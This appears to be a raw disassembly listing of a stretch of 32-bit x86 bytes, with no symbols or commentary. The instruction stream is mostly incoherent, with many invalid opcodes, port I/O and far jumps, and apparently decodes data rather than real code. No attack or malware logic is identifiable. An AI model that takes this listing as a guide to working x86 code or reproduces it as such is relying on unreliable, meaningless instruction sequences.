  41dd33:	and    ecx,DWORD PTR [edi+0x1e]
  41dd36:	sbb    BYTE PTR [ecx],cl
  41dd38:	leave  
  41dd39:	add    ecx,esi
  41dd3b:	mov    ds:0x9a08561a,al
  41dd40:	mov    bh,0x29
  41dd42:	imul   ebx,DWORD PTR [ebp+ebx*8+0x20],0x387fe30c
  41dd4a:	retf   
  41dd4b:	loopne 0x41dd2d
  41dd4d:	les    eax,FWORD PTR [esi]
  41dd4f:	dec    edx
  41dd50:	xchg   ebx,eax
  41dd51:	adc    eax,esp
  41dd53:	adc    DWORD PTR [edx-0x1b6b18a7],edi
  41dd59:	and    ebx,esp
  41dd5b:	loope  0x41ddd5
  41dd5d:	mov    eax,0xad82a01a
  41dd62:	add    ah,BYTE PTR [edx]
  41dd64:	sbb    al,BYTE PTR [esi+0x8]
  41dd67:	call   0x2238:0x176c3c64
  41dd6e:	xchg   DWORD PTR [edi],edx
  41dd70:	ds jmp 0x41ddc7
  41dd73:	mov    ch,0x79
  41dd75:	pop    es
  41dd76:	push   esi
  41dd77:	mov    ch,0x4f
  41dd79:	bound  eax,QWORD PTR [ecx+0x29f013df]
  41dd7f:	and    bl,bl
  41dd81:	out    0x85,eax
  41dd83:	das    
  41dd84:	ret    0xd661
  41dd87:	adc    eax,0x1f8d3fc1
  41dd8c:	adc    bl,ch
  41dd8e:	push   ebp
  41dd8f:	xchg   esi,eax
  41dd90:	fs jp  0x41dd7c
  41dd93:	push   ss
  41dd94:	lods   al,BYTE PTR ds:[esi]
  41dd95:	jns    0x41dd1e
  41dd97:	pusha  
  41dd98:	jp     0x41dd36
  41dd9a:	test   DWORD PTR [ebp+0x1d5737c1],ebp
  41dda0:	out    0xa5,al
  41dda2:	lods   al,BYTE PTR ds:[esi]
  41dda3:	lds    esi,FWORD PTR [esi-0x656b6a86]
  41dda9:	bound  ecx,QWORD PTR [esi+0x29]
  41ddac:	jns    0x41dd59
  41ddae:	ror    BYTE PTR [esi],1
  41ddb0:	xchg   ebp,eax
  41ddb1:	xchg   BYTE PTR [edx+0x50],dh
  41ddb4:	xchg   ecx,eax
  41ddb5:	xchg   ecx,eax
  41ddb6:	sub    edi,0x17
  41ddb9:	das    
  41ddba:	inc    edi
  41ddbb:	adc    BYTE PTR [ebx-0x18],dl
  41ddbe:	xchg   DWORD PTR [edi],ebp
  41ddc0:	into   
  41ddc1:	arpl   WORD PTR [ebx-0x1a],bp
  41ddc4:	mov    ecx,DWORD PTR [esi+0x43]
  41ddc7:	mov    esi,0xc5aca5e6
  41ddcc:	add    al,0xa0
  41ddce:	out    0x11,eax
  41ddd0:	push   ebx
  41ddd1:	push   ebp
  41ddd2:	hlt    
  41ddd3:	cmp    al,0x11
  41ddd5:	sbb    BYTE PTR cs:0x1df2bac1,ch
  41dddc:	dec    ecx
  41dddd:	add    al,0x5f
  41dddf:	retf   
  41dde0:	mov    ecx,0x82063986
  41dde5:	jnp    0x41de3a
  41dde7:	imul   eax,edx,0x1511ee61
  41dded:	sub    al,0xbe
  41ddef:	rcl    DWORD PTR [edi+0x52],0x83
  41ddf3:	out    0x13,eax
  41ddf5:	cs cmp eax,0xfd8ad5d
  41ddfb:	fwait
  41ddfc:	je     0x41de27
  41ddfe:	jp     0x41dde6
  41de00:	rcl    DWORD PTR [esi],0xb5
  41de03:	or     cl,BYTE PTR [edi+eax*1-0x4f]
  41de07:	xchg   edx,eax
  41de08:	out    dx,eax
  41de09:	jns    0x41de77
  41de0b:	pop    esp
  41de0c:	fist   WORD PTR [edx]
  41de0e:	iret   
  41de0f:	loop   0x41de4d
  41de11:	scas   eax,DWORD PTR es:[edi]
  41de12:	mov    eax,0xf2b20317
  41de17:	adc    eax,DWORD PTR [eax+ebx*1+0x41]
  41de1b:	out    dx,eax
  41de1c:	or     BYTE PTR [eax],ah
  41de1e:	out    0x17,eax
  41de20:	sbb    edx,eax
  41de22:	cmovno esi,eax
  41de25:	mov    bh,0xc4
  41de27:	mov    ch,0xcf
  41de29:	push   cs
  41de2a:	jb     0x41de88
  41de2c:	xchg   ecx,eax
  41de2d:	and    esi,eax
  41de2f:	shr    esp,cl
  41de31:	mov    BYTE PTR [edi+0x2e],ch
  41de34:	cdq    
  41de35:	or     esi,ebp
  41de37:	loopne 0x41de76
  41de39:	ficom  DWORD PTR [eax+0x6d]
  41de3c:	dec    esp
  41de3d:	or     BYTE PTR [eax+0x3],0x6f
  41de41:	mov    ds:0xc64c551,eax
  41de46:	xchg   esp,eax
  41de47:	pop    esp
  41de48:	fisubr WORD PTR [eax-0x5e82d3f5]
  41de4e:	out    0x12,al
  41de50:	and    bh,al
  41de52:	mov    ecx,DWORD PTR [edi]
  41de54:	test   BYTE PTR [esi],0xf7
  41de57:	out    dx,eax
  41de58:	pop    ss
  41de59:	xchg   BYTE PTR [ecx],bl
  41de5b:	shl    BYTE PTR [edi],cl
  41de5d:	push   ebp
  41de5e:	lock xchg ebp,eax
  41de60:	outs   dx,DWORD PTR ds:[esi]
  41de61:	and    al,0x18
  41de63:	mov    al,0xb2
  41de65:	dec    esp
  41de66:	inc    esp
  41de67:	jbe    0x41de82
  41de69:	xchg   BYTE PTR [ecx+0x2ef233cf],al
  41de6f:	(bad)  
  41de70:	push   ecx
  41de71:	gs in  al,dx
  41de73:	loope  0x41dee5
  41de75:	fcomp  QWORD PTR [edx]
  41de77:	test   al,0xae
  41de79:	dec    esp
  41de7a:	pop    esp
  41de7b:	sbb    dl,BYTE PTR [ebx-0x55ee1ff5]
  41de81:	pop    ecx
  41de82:	push   edi
  41de83:	pop    ss
  41de84:	lods   eax,DWORD PTR ds:[esi]
  41de85:	sub    eax,DWORD PTR [edi+0x50d3f22f]
  41de8b:	xchg   edi,eax
  41de8c:	dec    esi
  41de8d:	xchg   esi,eax
  41de8e:	stc    
  41de8f:	pop    ds
  41de90:	xor    bh,BYTE PTR [ecx+ecx*1]
  41de93:	repnz out dx,eax
  41de95:	pop    ecx
  41de96:	ins    BYTE PTR es:[edi],dx
  41de97:	(bad)  
  41de98:	daa    
  41de99:	push   ebp
  41de9a:	in     al,0x95
  41de9c:	dec    edi
  41de9d:	or     al,0x6c
  41de9f:	mov    al,0x7e
  41dea1:	inc    edx
  41dea2:	(bad)  
  41dea3:	aas    
  41dea4:	adc    al,0x3c
  41dea6:	or     edx,esi
  41dea8:	out    dx,eax
  41dea9:	pop    ecx
  41deaa:	ins    BYTE PTR es:[edi],dx
  41deab:	(bad)  
  41deac:	daa    
  41dead:	push   ebp
  41deae:	in     al,0x3a
  41deb0:	lds    edi,FWORD PTR [ebp+0x1f0f6ca7]
  41deb6:	ins    BYTE PTR es:[edi],dx
  41deb7:	dec    esi
  41deb8:	jb     0x41df10
  41deba:	sbb    BYTE PTR [edx-0x3993ee11],bl
  41dec0:	fsub   DWORD PTR [eax]
  41dec2:	pop    esp
  41dec3:	xchg   ebp,eax
  41dec4:	outs   dx,DWORD PTR ds:[esi]
  41dec5:	fcomp  QWORD PTR [eax]
  41dec7:	cwde   
  41dec8:	xchg   edx,eax
  41dec9:	dec    esp
  41deca:	jae    0x41de7e
  41decc:	xchg   ecx,eax
  41decd:	add    edx,esp
  41decf:	xchg   ebp,eax
  41ded0:	pop    eax
  41ded1:	xor    ebp,DWORD PTR [edx-0x79]
  41ded4:	pop    ecx
  41ded5:	loop   0x41decb
  41ded7:	push   0x3a
  41ded9:	call   0x4da08df6
  41dede:	add    dl,al
  41dee0:	sbb    eax,0x9ad34f10
  41dee5:	mov    ?,WORD PTR ds:0xdd95b87
  41deeb:	pop    ds
  41deec:	xor    BYTE PTR [ebx-0x22],ah
  41deef:	or     eax,0x610a85c1
  41def4:	sar    BYTE PTR [ebp+0x75ad1105],cl
  41defa:	ds push ebp
  41defc:	sbb    cl,BYTE PTR [eax]
  41defe:	xchg   DWORD PTR [eax],esp
  41df00:	ss mov dl,0xb8
  41df03:	sub    eax,0xc1debac1
  41df08:	pop    eax
  41df09:	pop    edx
  41df0a:	or     esp,DWORD PTR [edx-0x48]
  41df0d:	sub    eax,DWORD PTR [esi]
  41df0f:	shl    BYTE PTR [eax+0x3a6a1c20],cl
  41df15:	mov    ecx,0xf31f1ac4
  41df1a:	pop    esp
  41df1b:	adc    eax,0x991c1491
  41df20:	stos   BYTE PTR es:[edi],al
  41df21:	and    edi,0x1c6a5326
  41df27:	out    dx,eax
  41df28:	repz pushf 
  41df2a:	call   0x5d0c:0x14f4c6f
  41df31:	pop    ds
  41df32:	jge    0x41dfa1
  41df34:	ins    BYTE PTR es:[edi],dx
  41df35:	mov    ebx,0x55918f44
  41df3a:	mov    al,ds:0x18347fe1
  41df3f:	ins    DWORD PTR es:[edi],dx
  41df40:	retf   0x6c7
  41df43:	dec    edx
  41df44:	sub    DWORD PTR [ecx+eax*4+0x6c796f0a],eax
  41df4b:	(bad)  
  41df4c:	push   ebx
  41df4d:	loope  0x41ded8
  41df4f:	stos   BYTE PTR es:[edi],al
  41df50:	xor    eax,0x4ae50a6c
  41df55:	mov    DWORD PTR ds:0xf0ddc20f,0x6f75a811
  41df5f:	xchg   ebx,eax
  41df60:	add    BYTE PTR [eax-0xd],dh
  41df63:	aas    
  41df64:	jle    0x41dfc9
  41df66:	dec    ebx
  41df67:	outs   dx,BYTE PTR ds:[esi]
  41df68:	or     eax,0xc20f05d7
  41df6d:	fisttp WORD PTR [ebp+0x4e]
  41df70:	fs mov edi,esp
  41df73:	xchg   ecx,eax
  41df74:	fsub   QWORD PTR [eax-0x77]
  41df77:	stos   BYTE PTR es:[edi],al
  41df78:	dec    edi
  41df79:	(bad)  
  41df7a:	sbb    dl,ah
  41df7c:	dec    ecx
  41df7d:	sbb    dh,0xc1
  41df80:	jmp    0x6c79:0xef330edd
  41df87:	lods   al,BYTE PTR es:[esi]
  41df89:	daa    
  41df8a:	sub    DWORD PTR [ebp+0xe93e8c5],edx
  41df90:	dec    edi
  41df91:	les    eax,FWORD PTR [ebx-0x6e]
  41df94:	pop    edx
  41df95:	push   ss
  41df96:	pop    eax
  41df97:	leave  
  41df98:	adc    BYTE PTR [esp+ebp*1],ch
  41df9b:	pop    ebp
  41df9c:	adc    BYTE PTR [ebx-0x174e41b7],ch
  41dfa2:	test   al,0x24
  41dfa4:	ds sti 
  41dfa6:	(bad)  
  41dfa7:	aas    
  41dfa8:	into   
  41dfa9:	fisttp QWORD PTR [esi]
  41dfab:	pop    ds
  41dfac:	das    
  41dfad:	or     eax,0x20d87f5f
  41dfb2:	or     al,0x9a
  41dfb4:	dec    esi
  41dfb5:	out    dx,eax
  41dfb6:	mov    dh,0x1a
  41dfb8:	mov    ch,0xc7
  41dfba:	push   es
  41dfbb:	mov    eax,ds:0x424d551f
  41dfc0:	scas   eax,DWORD PTR es:[edi]
  41dfc1:	cmp    DWORD PTR [eax*4-0x1cb38ad9],edi
  41dfc8:	cmp    al,0xb8
  41dfca:	sbb    BYTE PTR [edx-0x6dbc3ba6],ah
  41dfd0:	xchg   ecx,eax
  41dfd1:	sahf   
  41dfd2:	sbb    DWORD PTR [esp+eax*8+0x3c],0xffffffb8
  41dfd7:	aad    0x19
  41dfd9:	jns    0x41df60
  41dfdb:	bound  edi,QWORD PTR [esi+ebp*4-0x2b]
  41dfdf:	mov    ds:0x3ae72ca1,eax
  41dfe4:	pop    ebx
  41dfe5:	in     al,0xf8
  41dfe7:	jecxz  0x41e068
  41dfe9:	sbb    al,0x18
  41dfeb:	mov    eax,0x4e454c42
  41dff0:	dec    edx
  41dff1:	fstp   QWORD PTR [ebx-0x46]
  41dff4:	cmp    edi,DWORD PTR fs:[esi+eax*4+0x53]
  41dff9:	bound  eax,QWORD PTR [edx*4+0x1dd661ea]
  41e000:	ror    DWORD PTR [edx+ecx*1+0x495af38b],0x5b
  41e008:	push   cs
  41e009:	jne    0x41e06a
  41e00b:	push   ss
  41e00c:	mov    dl,0x60
  41e00e:	fs push 0x2a
  41e011:	call   0x4c5c94a9
  41e016:	inc    ebx
  41e017:	mov    dl,0xe5
  41e019:	xchg   BYTE PTR [ebp-0x1ab964a6],cl
  41e01f:	xchg   ebx,eax
  41e020:	and    al,0xab
  41e022:	jno    0x41dfba
  41e024:	mov    cl,0xbb
  41e026:	xchg   DWORD PTR [esi-0x3ee9633f],esi
  41e02c:	sub    DWORD PTR [ecx-0x41],ebx
  41e02f:	nop
  41e030:	ins    BYTE PTR es:[edi],dx
  41e031:	sub    BYTE PTR [edx+eiz*4-0x2e],0x63
  41e036:	dec    edi
  41e037:	sub    DWORD PTR [ecx-0x56],edi
  41e03a:	rcl    DWORD PTR [esi],1
  41e03c:	out    dx,al
  41e03d:	sub    al,0xea
  41e03f:	adc    DWORD PTR [ecx-0x63ee0bd5],edx
  41e045:	popa   
  41e046:	out    0x95,eax
  41e048:	les    ebp,FWORD PTR [ebx-0x444e99b9]
  41e04e:	fwait
  41e04f:	sbb    bl,BYTE PTR [eax-0x6e95b2b4]
  41e055:	adc    esi,esp
  41e057:	cdq    
  41e058:	stos   BYTE PTR es:[edi],al
  41e059:	lea    edi,ds:0xe9ab0829
  41e05f:	aaa    
  41e060:	stc    
  41e061:	add    BYTE PTR [ebp+0xfdd0e8d],al
  41e067:	pop    ds
  41e068:	das    
  41e069:	jbe    0x41e054
  41e06b:	mov    edx,0xe1f3df27
  41e070:	jg     0x41e0a2
  41e072:	test   al,0xa0
  41e074:	scas   al,BYTE PTR es:[edi]
  41e075:	mov    bl,0x5e
  41e077:	sbb    dl,BYTE PTR [ecx+0x2db1ec03]
  41e07d:	repnz mov ah,0x8c
  41e080:	push   ebx
  41e081:	gs shl cl,1
  41e084:	mov    dl,0x4c
  41e086:	xchg   ebx,eax
  41e087:	in     eax,0x4a
  41e089:	dec    esp
  41e08a:	xchg   dl,ch
  41e08c:	sbb    dl,BYTE PTR [esi+0x8]
  41e08f:	cdq    
  41e090:	sub    eax,0x9e5d9cf2
  41e095:	and    al,0x27
  41e097:	mov    ds:0xed7b6b6b,al
  41e09c:	fwait
  41e09d:	das    
  41e09e:	lea    eax,[edx-0x187caf6f]
  41e0a4:	aaa    
  41e0a5:	jp     0x41e03b
  41e0a7:	push   ebp
  41e0a8:	push   ds
  41e0a9:	sub    BYTE PTR [ebx],al
  41e0ab:	fnstsw WORD PTR [edi+edi*4]
  41e0ae:	ret    
  41e0af:	sub    DWORD PTR [edi+0x38],0x9
  41e0b3:	dec    ecx
  41e0b4:	loop   0x41e0c4
  41e0b6:	leave  
  41e0b7:	jb     0x41e09c
  41e0b9:	cli    
  41e0ba:	xchg   esp,eax
  41e0bb:	aad    0xad
  41e0bd:	xchg   DWORD PTR es:[ebp+0x39],ebp
  41e0c1:	sub    ebx,DWORD PTR [edx]
  41e0c3:	loop   0x41e0da
  41e0c5:	add    DWORD PTR [eax+0x3],0x1f51b66f
  41e0cc:	es or  al,0xa8
  41e0cf:	pop    ebx
  41e0d0:	lods   eax,DWORD PTR ds:[esi]
  41e0d1:	int3   
  41e0d2:	pop    edx
  41e0d3:	add    BYTE PTR [eax],bh
  41e0d5:	adc    BYTE PTR [ebx-0x638b50b],0x3f
  41e0dc:	ret    0x5da9
  41e0df:	stos   BYTE PTR es:[edi],al
  41e0e0:	fs cmp al,0xb0
  41e0e3:	fldcw  WORD PTR [edi+0x68]
  41e0e6:	or     ah,BYTE PTR [ebp-0x73]
  41e0e9:	nop
  41e0ea:	xchg   DWORD PTR [esi-0x76],esp
  41e0ed:	fild   WORD PTR ds:0xf1d54bb2
  41e0f3:	fwait
  41e0f4:	call   0xfcb:0x3093e77c
  41e0fb:	loope  0x41e17a
  41e0fd:	fcomp  QWORD PTR [eax]
  41e0ff:	mov    edx,0xc1c5ec46
  41e104:	retf   0x5555
  41e107:	inc    edx
  41e108:	fdiv   QWORD PTR [eax-0xe036e19]
  41e10e:	in     al,dx
  41e10f:	mov    ebx,0x347339eb
  41e114:	fwait
  41e115:	push   ss
  41e116:	out    0x39,al
  41e118:	sbb    ebp,edx
  41e11a:	rcr    DWORD PTR [esi+0x52cb9dc],0x38
  41e121:	jbe    0x41e17f
  41e123:	cmp    BYTE PTR [ecx+0x17],ch
  41e126:	(bad)  
  41e127:	aad    0x13
  41e129:	inc    esp
  41e12a:	shl    DWORD PTR [edx+0x53],0x23
  41e12e:	leave  
  41e12f:	repnz out dx,eax
  41e131:	stc    
  41e132:	ins    BYTE PTR es:[edi],dx
  41e133:	(bad)  
  41e134:	mov    edi,ebx
  41e136:	jns    0x41e0ce
  41e138:	lds    edi,FWORD PTR [ebp+0x1f0f6ebf]
  41e13e:	cmp    eax,0x1022fe0f
  41e143:	adc    DWORD PTR [edi],esp
  41e145:	sbb    eax,0x20d8e6cd
  41e14a:	or     al,0xe1
  41e14c:	ret    0xdc61
  41e14f:	in     eax,dx
  41e150:	rol    DWORD PTR [eax+0x5a5ac10a],0x81
  41e157:	shl    bh,cl
  41e159:	repnz lods eax,DWORD PTR ds:[esi]
  41e15b:	aad    0x9d
  41e15d:	rol    BYTE PTR [edi+0x7f63260f],0x66
  41e164:	(bad)  
  41e165:	iret   
  41e166:	stc    
  41e167:	stos   BYTE PTR es:[edi],al
  41e168:	inc    edi
  41e169:	xchg   ebp,eax
  41e16a:	pop    ebp
  41e16b:	int    0xb9
  41e16d:	sub    bh,BYTE PTR ds:0xcc5b84
  41e173:	xchg   esi,eax
  41e174:	mov    cl,0x9c
  41e176:	mov    bh,0xcd
  41e178:	sar    DWORD PTR [ebx+0x55a77a22],0x8
  41e17f:	call   0x8c03:0xe7ac48ef
  41e186:	xor    BYTE PTR [ebx+0x4c],bh
  41e189:	retf   
  41e18a:	mov    edi,0x75c376f4
  41e18f:	bound  edx,QWORD PTR [ebx-0x155d1c69]
  41e195:	xchg   BYTE PTR [esi+edx*8-0x28],ch
  41e199:	stos   BYTE PTR es:[edi],al
  41e19a:	adc    ch,BYTE PTR [edx+esi*1]
  41e19d:	xor    esp,edi
  41e19f:	adc    edi,eax
  41e1a1:	sbb    DWORD PTR [esi],0x58
  41e1a4:	icebp  
  41e1a5:	inc    esp
  41e1a6:	test   esi,ebp
  41e1a8:	leave  
  41e1a9:	jns    0x41e191
  41e1ab:	rcr    BYTE PTR [esi+0x73191c1c],1
  41e1b1:	loopne 0x41e206
  41e1b3:	xchg   ecx,eax
  41e1b4:	scas   al,BYTE PTR es:[edi]
  41e1b5:	inc    esp
  41e1b6:	(bad)  
  41e1b7:	dec    ecx
  41e1b8:	xchg   ebx,eax
  41e1b9:	xchg   edi,eax
  41e1ba:	leave  
  41e1bb:	jb     0x41e1aa
  41e1bd:	pop    eax
  41e1be:	test   DWORD PTR [ebp-0x32],ebx
  41e1c1:	mov    ds:0xffb36eca,eax
  41e1c6:	adc    BYTE PTR [edx],ah
  41e1c8:	dec    esi
  41e1c9:	(bad)  
  41e1ca:	jae    0x41e185
  41e1cc:	jmp    0xa9de64c3
  41e1d1:	inc    ebp
  41e1d2:	jl     0x41e179
  41e1d4:	std    
  41e1d5:	loope  0x41e1bb
  41e1d7:	push   0x721ef6b0
  41e1dc:	mov    ch,0x30
  41e1de:	stc    
  41e1df:	mov    ch,0x97
  41e1e1:	push   edx
  41e1e2:	nop
  41e1e3:	fadd   st(6),st
  41e1e5:	mov    ebx,0x2750d4e6
  41e1ea:	xchg   BYTE PTR [eax],ch
  41e1ec:	cmp    esp,DWORD PTR [eax-0x2c]
  41e1ef:	in     al,0xc0
  41e1f1:	test   DWORD PTR [edx+eax*8],eax
  41e1f4:	pop    ebp
  41e1f5:	push   esp
  41e1f6:	or     DWORD PTR [ebp+0x4],esi
  41e1f9:	push   cs
  41e1fa:	push   eax
  41e1fb:	xchg   esi,eax
  41e1fc:	stos   BYTE PTR es:[edi],al
  41e1fd:	adc    al,0x85
  41e1ff:	stos   DWORD PTR es:[edi],eax
  41e200:	sti    
  41e201:	add    BYTE PTR [ecx-0x7ac7e298],dl
  41e207:	stos   BYTE PTR es:[edi],al
  41e208:	sbb    eax,0x65b16dc
  41e20d:	jl     0x41e1f0
  41e20f:	rol    BYTE PTR [eax],cl
  41e211:	and    ax,0x7ba8
  41e215:	sar    DWORD PTR [ebx-0x6a],1
  41e218:	jge    0x41e246
  41e21a:	jno    0x41e26b
  41e21c:	in     eax,0x56
  41e21e:	or     BYTE PTR [edx-0x21d5989b],bl
  41e224:	add    edx,DWORD PTR [eax+edi*8-0x19]
  41e228:	jbe    0x41e21a
  41e22a:	mov    dl,0xd4
  41e22c:	mov    ch,BYTE PTR [ecx+ecx*1]
  41e22f:	(bad)  
  41e230:	ins    BYTE PTR es:[edi],dx
  41e231:	push   esi
  41e232:	xor    al,0xba
  41e234:	popf   
  41e235:	add    eax,0x54c736ef
  41e23a:	jmp    0xf62c5526
  41e23f:	outs   dx,BYTE PTR ds:[esi]
  41e240:	dec    esp
  41e241:	dec    edx
  41e242:	push   ecx
  41e243:	mov    ch,0xdb
  41e245:	mov    esi,0x7b29190a
  41e24a:	inc    ebp
  41e24b:	adc    al,0xe1
  41e24d:	enter  0x287e,0xb3
  41e251:	and    edx,DWORD PTR [edx+0xe]
  41e254:	dec    eax
  41e255:	mov    bl,0x17
  41e257:	rcr    DWORD PTR [eax],0xd5
  41e25a:	retf   0x669e
  41e25d:	jle    0x41e24e
  41e25f:	adc    esp,ebx
  41e261:	imul   edi,DWORD PTR [ecx-0x67],0x1b
  41e265:	add    edi,esp
  41e267:	in     al,dx
  41e268:	rol    ch,0x44
  41e26b:	ret    0x111d
  41e26e:	inc    ecx
  41e26f:	out    dx,eax
  41e270:	sbb    bl,dh
  41e272:	sub    ch,BYTE PTR [eax]
  41e274:	stc    
  41e275:	enter  0xee03,0x14
  41e279:	pop    ss
  41e27a:	ins    BYTE PTR es:[edi],dx
  41e27b:	sbb    al,al
  41e27d:	leave  
  41e27e:	inc    eax
  41e27f:	ret    0x1115
  41e282:	inc    eax
  41e283:	out    dx,eax
  41e284:	sbb    bl,dh
  41e286:	push   0xffffff90
  41e288:	xor    DWORD PTR [ebp-0xd],ecx
  41e28b:	xchg   ebp,eax
  41e28c:	lds    edi,FWORD PTR [eax+0x1e]
  41e28f:	xchg   ecx,eax
  41e290:	ins    BYTE PTR es:[edi],dx
  41e291:	mov    DWORD PTR [ecx-0x7e0d1664],0xedae044c
  41e29b:	pop    ss
  41e29c:	daa    
  41e29d:	and    BYTE PTR [edx+ebp*2],cl
  41e2a0:	mov    al,0xf6
  41e2a2:	aad    0xed
  41e2a4:	xchg   ecx,eax
  41e2a5:	mov    bl,0xf5
  41e2a7:	(bad)  
  41e2a8:	push   esi
  41e2a9:	pop    ebp
  41e2aa:	add    DWORD PTR [ecx-0xa],esi
  41e2ad:	jmp    0x21408593
  41e2b2:	xor    BYTE PTR [edx+0x48],bh
  41e2b5:	les    ebx,FWORD PTR [edx]
  41e2b7:	and    al,0xc9
  41e2b9:	daa    
  41e2ba:	push   cs
  41e2bb:	mov    edi,edx
  41e2bd:	pop    ebx
  41e2be:	mov    edi,DWORD PTR [ebx-0x18]
  41e2c1:	or     eax,0x221955b1
  41e2c6:	push   0xffffffe1
  41e2c8:	cmp    al,0x6b
  41e2ca:	push   ebp
  41e2cb:	out    0xc7,eax
  41e2cd:	push   eax
  41e2ce:	push   es
  41e2cf:	mov    ah,ch
  41e2d1:	test   eax,0xded72c9
  41e2d6:	inc    edi
  41e2d7:	call   FWORD PTR [edx]
  41e2d9:	leave  
  41e2da:	jle    0x41e271
  41e2dc:	lds    edx,FWORD PTR [edi]
  41e2de:	push   ds
  41e2df:	xchg   ecx,eax
  41e2e0:	ins    BYTE PTR es:[edi],dx
  41e2e1:	mov    edi,0x16dc18a2
  41e2e7:	pop    ss
  41e2e8:	mov    eax,0x40d2e186
  41e2ed:	and    ax,0xb0a8
  41e2f1:	jmp    0xc207:0x9dc0e21b
  41e2f8:	inc    ebp
  41e2f9:	push   edi
  41e2fa:	mov    ebx,DWORD PTR [ebp-0x13]
  41e2fd:	nop
  41e2fe:	add    ebp,DWORD PTR [ecx]
  41e300:	daa    
  41e301:	fisttp WORD PTR [edi+0x6e73993]
  41e307:	and    eax,0x622293c1
  41e30c:	sbb    DWORD PTR [edx],eax
  41e30e:	sub    al,0xb6
  41e310:	(bad)  
  41e311:	scas   eax,DWORD PTR es:[edi]
  41e312:	sbb    esi,eax
  41e314:	stos   BYTE PTR es:[edi],al
  41e315:	cmp    eax,0xd81e1627
  41e31a:	sbb    BYTE PTR [ecx+0x708ff36e],dh
  41e320:	in     eax,dx
  41e321:	mov    cs,WORD PTR [ebx+0x3523e35e]
  41e327:	lea    eax,[esi-0x7d56ae81]
  41e32d:	jmp    0x2c8cc8c5
  41e332:	in     eax,0xf2
  41e334:	adc    dl,BYTE PTR [esi+0x8]
  41e337:	call   0x20d8:0xd2d4a504
  41e33e:	or     al,0x81
  41e340:	out    dx,eax
  41e341:	popa   
  41e342:	gs push 0x4a06e0f6
  41e348:	sbb    dl,BYTE PTR [esi+0x5d]
  41e34b:	adc    DWORD PTR [ebx],eax
  41e34d:	cli    
  41e34e:	add    dh,0x8f
  41e351:	jbe    0x41e3b2
  41e353:	loope  0x41e3c4
  41e355:	loopne 0x41e36f
  41e357:	mov    al,ds:0xd6c446
  41e35c:	push   eax
  41e35d:	pop    ecx
  41e35e:	mov    edi,0x903c6698
  41e363:	pop    ebp
  41e364:	adc    cl,ah
  41e366:	in     al,dx
  41e367:	push   0xb01a3811
  41e36c:	mov    edx,0xda795795
  41e371:	fst    st(0)
  41e373:	adc    ebp,ebp
  41e375:	mov    eax,0xe3e3ce84
  41e37a:	jp     0x41e3e4
  41e37c:	mov    cl,0x30
  41e37e:	shl    DWORD PTR [edi+0x3f4f8508],1
  41e384:	hlt    
  41e385:	jae    0x2a3292e4
  41e38b:	and    ch,BYTE PTR [edi]
  41e38d:	rol    DWORD PTR [edi-0x2914cdd1],0xe9
  41e394:	adc    BYTE PTR [esi+0x43],cl
  41e397:	mov    dl,0x91
  41e399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e39a:	add    edi,0x1b
  41e39d:	repnz adc esi,ebx
  41e3a0:	mov    DWORD PTR [esi-0x79],esi
  41e3a3:	push   0xfd7b296a
  41e3a8:	ret    0x40c1
  41e3ab:	rcl    edx,0xe
  41e3ae:	sub    eax,0x6c861065
  41e3b3:	aad    0x20
  41e3b5:	stos   BYTE PTR es:[edi],al
  41e3b6:	or     esp,edx
  41e3b8:	cmp    al,0xaf
  41e3ba:	aad    0xac
  41e3bc:	aas    
  41e3bd:	xor    BYTE PTR [eax+0x49],bl
  41e3c0:	jmp    0xae1a2dd9
  41e3c5:	and    BYTE PTR ds:0x79ab0ca3,ah
  41e3cb:	bound  esi,QWORD PTR [ecx+0x1db38395]
  41e3d1:	dec    esp
  41e3d2:	jnp    0x41e386
  41e3d4:	xchg   ecx,eax
  41e3d5:	sbb    esi,esp
  41e3d7:	adc    DWORD PTR [edx-0x707fc273],edi
  41e3dd:	adc    eax,ebp
  41e3df:	loopne 0x41e416
  41e3e1:	scas   eax,DWORD PTR es:[edi]
  41e3e2:	pusha  
  41e3e3:	inc    ebx
  41e3e4:	adc    eax,0x4466e5a0
  41e3e9:	ud2    
  41e3eb:	pusha  
  41e3ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3ed:	or     al,0x87
  41e3ef:	mov    DWORD PTR [esi-0x5103255],eax
  41e3f5:	pushf  
  41e3f6:	xchg   edi,eax
  41e3f7:	out    0xba,al
  41e3f9:	sub    al,0x0
  41e3fb:	rcr    BYTE PTR [esi+ebx*8],0xf
  41e3ff:	(bad)  [ecx-0x1cd9d60e]
  41e405:	sar    BYTE PTR [esi-0x53],1
  41e408:	mov    cl,0x2f
  41e40a:	mov    eax,0x589c5aa0
  41e40f:	adc    eax,0x9a0494d3
  41e414:	mov    bh,0x21
  41e416:	out    0xd9,al
  41e418:	xor    esi,ebp
  41e41a:	int3   
  41e41b:	int3   
  41e41c:	int3   
  41e41d:	int3   
  41e41e:	int3   
  41e41f:	int3   
  41e420:	inc    eax
  41e421:	inc    eax
  41e422:	add    BYTE PTR [ecx],al
  41e424:	inc    eax
  41e425:	bound  ebp,QWORD PTR [ecx]
  41e427:	int3   
  41e428:	test   BYTE PTR [edx+0x31],0x9f
  41e42c:	ja     0x41e471
  41e42e:	cli    
  41e42f:	jne    0x41e480
  41e431:	inc    edx
  41e432:	sub    al,0x2
  41e434:	push   edx
  41e435:	dec    edx
  41e436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e437:	sub    al,0xa4
  41e439:	pop    edi
  41e43a:	std    
  41e43b:	lahf   
  41e43c:	aam    0xed
  41e43e:	or     eax,0x432c0dc8
  41e443:	out    dx,eax
  41e444:	adc    BYTE PTR fs:[ecx-0x59],al
  41e448:	inc    ebx
  41e449:	inc    edx
  41e44a:	mov    edi,0x42c42a41
  41e44f:	test   al,0x48
  41e451:	cmp    al,0x2d
  41e453:	call   DWORD PTR [esi+0xd7ac4cd]
  41e459:	fcomp  DWORD PTR [edi+0x40]
  41e45c:	inc    eax
  41e45d:	inc    ecx
  41e45e:	bound  eax,QWORD PTR [eax]
  41e460:	inc    ecx
  41e461:	bound  eax,QWORD PTR [ecx]
  41e463:	inc    eax
  41e464:	add    bl,cl
  41e466:	adc    DWORD PTR [esi],eax
  41e468:	and    ecx,ebx
  41e46a:	inc    eax
  41e46b:	add    DWORD PTR [edi-0x7a069391],ebx
  41e471:	sub    al,0x40
  41e473:	fistp  QWORD PTR [edx-0x3d]
  41e476:	or     BYTE PTR [eax+ebp*1+0x1fc42146],ah
  41e47d:	sub    ecx,ebx
  41e47f:	ret    0x4730
  41e482:	xor    al,0x7f
  41e484:	add    bh,BYTE PTR [edi]
